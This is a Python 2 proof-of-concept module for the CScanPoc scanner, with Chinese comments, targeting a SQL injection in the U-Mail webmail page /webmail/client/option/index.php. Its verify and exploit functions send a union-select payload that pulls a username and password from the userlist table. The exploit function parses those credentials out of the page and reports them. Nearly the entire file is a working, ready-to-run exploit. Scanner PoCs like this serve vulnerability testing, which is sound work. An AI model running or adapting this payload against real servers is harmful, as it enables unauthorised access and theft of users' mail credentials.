# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    poc_id = '5d1e4e7c-5207-451c-a592-577953e4d6cc'
    name = 'U-Mail /webmail/client/option/index.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-03'  # 漏洞公布时间
    desc = '''
        U-Mail /webmail/client/option/index.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=073032' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd138acaf-5bea-49e7-a7c8-22e15f04efbf'
    author = '国光'  # POC编写者
    create_date = '2018-05-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/webmail/client/option/index.php?module=view&action=letterpaper&id=1%20and%201=2%20union%20select%201,2,3,"
                   "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8"
                   "/**/from/**/userlist/**/limit/**/0,1%23")

            verify_url = '{target}'.format(target=self.target) + payload
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r".*?<img id=\"littleing\" src=\"\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*\"></img>", re.I|re.S)
            match = pattern.match(content)
            if match != None:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            payload = ("/webmail/client/option/index.php?module=view&action=letterpaper&id=1%20and%201=2%20union%20select%201,2,3,"
                   "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8"
                   "/**/from/**/userlist/**/limit/**/0,1%23")

            verify_url = '{target}'.format(target=self.target) + payload
            content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            pattern = re.compile(r".*?<img id=\"littleing\" src=\"\s*~'\s*(?P<username>[^~]+)\s*~'\s*(?P<password>[\w]+)\s*\"></img>", re.I|re.S)
            match = pattern.match(content)
            if match != None:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,username=username,password=password
))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()